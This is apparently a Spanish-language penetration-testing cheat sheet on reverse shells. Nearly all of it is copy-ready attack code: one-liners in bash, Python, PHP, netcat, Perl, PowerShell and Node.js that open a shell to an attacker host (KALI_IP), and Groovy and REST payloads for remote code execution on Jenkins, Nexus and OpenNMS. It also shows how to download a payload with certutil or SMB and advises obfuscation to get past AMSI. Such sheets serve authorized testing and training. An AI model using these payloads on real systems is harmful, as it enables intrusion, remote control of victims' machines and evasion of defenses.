---
title: Reverse Shells + TTY Stabilization
slug: reverse-shells
category: payloads
updated: 2026-07-01
summary: "One-liners (bash/py/php/ps1/node), TTY stabilization, app-specific payloads"
tags: [reverse-shell, tty, shell, payload, netcat, bash]
sensitive: false
---

# Reverse Shells + TTY Stabilization

## When to use
Tienes RCE (webshell, vuln, command injection) y necesitas shell interactiva. Siempre estabilizar la TTY para evitar Ctrl+C fatal, tab completion, etc.

## Listeners
```bash
nc -lvnp 4444
rlwrap nc -lvnp 4444    # con historial (mejor para shells sin TTY previa)
```

## One-liners (elegir según el lenguaje disponible)
```bash
# Bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("KALI_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Netcat (si tiene -e)
nc -e /bin/bash KALI_IP 4444

# Netcat (sin -e — pipe)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc KALI_IP 4444 > /tmp/f

# Perl
perl -e 'use Socket;$i="KALI_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Node.js (Rocket.Chat, Jenkins Groovy, etc.)
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('bash -c "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"');
```

## TTY Estabilización (Linux)
```bash
# --- MÉTODO 1: Python pty (más común) ---
# En la shell recibida:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo
fg
# Presionar Enter dos veces si no aparece el prompt
export TERM=xterm
export SHELL=bash
stty rows 40 cols 150   # ajustar a tu terminal (stty size en otra terminal)

# --- MÉTODO 2: script ---
script /dev/null -c bash
# Ctrl+Z
stty raw -echo
fg
# Seleccionar terminal: xterm  → Enter
export TERM=xterm
export SHELL=bash
```

## TTY sobre HTTP (webshell sin upgrade)
```bash
# Si tienes webshell pero no puedes upgradear → usar socat
socat TCP:KALI_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# En Kali: socat FILE:`tty`,raw,echo=0 TCP-LISTEN:4444
```

## Aplicaciones específicas
```bash
# Jenkins Script Console (Groovy)
"cmd /c whoami".execute().text
"id".execute().text
Thread.start { ["bash","-c","bash -i >& /dev/tcp/KALI_IP/4444 0>&1"].execute() }

# Nexus Repository Groovy
curl -u admin:PASS -H "Content-Type: application/json" -X POST \
  http://TARGET:8081/service/rest/v1/script \
  -d '{"name":"rce","type":"groovy","content":"[\"bash\",\"-c\",\"bash -i >& /dev/tcp/KALI_IP/4444 0>&1\"].execute()"}'
curl -u admin:PASS -X POST http://TARGET:8081/service/rest/v1/script/rce/run -H "Content-Type: text/plain"

# OpenNMS notificationsCommands.xml (via File Editor → ROLE_FILESYSTEM_EDITOR)
# Insertar en el XML:
# <command binary="true"><name>rce</name><execute>/bin/bash</execute>
#   <argument streamed="false"><switch>-c</switch></argument>
#   <argument streamed="false"><switch>bash -i &gt;&amp; /dev/tcp/KALI_IP/4444 0&gt;&amp;1</switch></argument>
# </command>
# Disparar: POST /opennms/rest/events con uei reloadDaemonConfig daemonName=Scriptd
```

## Windows payload delivery (SMB guest bloqueado en Win10/2022)
`net use \\IP\share` → Error 1272 ("security policies block unauthenticated guest access") en Windows 10 y Server 2022 por defecto.

```cmd
REM Opción 1 — HTTP (preferida, sin auth)
certutil -urlcache -f http://KALI_IP:8000/payload.exe C:\Windows\Temp\payload.exe

REM Opción 2 — SMB con credenciales explícitas
REM   Kali: impacket-smbserver -smb2support -username user -password pass share /path/
net use \\KALI_IP\share pass /user:user
copy \\KALI_IP\share\payload.exe C:\Windows\Temp\
```

```bash
# Kali HTTP server
python3 -m http.server 8000
```

## Gotchas
- `stty raw -echo` en la terminal HOST (no en la shell remota) — es lo que hace el background job.
- Si el shell muere al hacer Ctrl+C → la TTY no fue estabilizada correctamente; repetir proceso.
- Bash one-liner con `>& /dev/tcp` requiere bash (no sh/dash) — si falla, usar nc o python.
- Windows PowerShell: AMSI puede bloquear el payload; ofuscar o usar `-EncodedCommand`.
- Node.js en Rocket.Chat: `console.log.constructor('return process.mainModule.require')()` necesita consola admin; hacktricks sugiere otro vector que puede no funcionar — usar este.
- SMB guest bloqueado en Win10/Server 2022 (Error 1272) → usar `certutil -urlcache -f` vía HTTP.

## References
- Relacionado: [[gtfobins-binaries]], [[web-app-attacks]], [[service-enumeration]], [[privilege-escalation]], [[windows-nssm-job-escape]]
- Notas internas de reverse shells.
- Notas internas de tratamiento de consola TTY.
- Notas de lab interno (host DMZ).
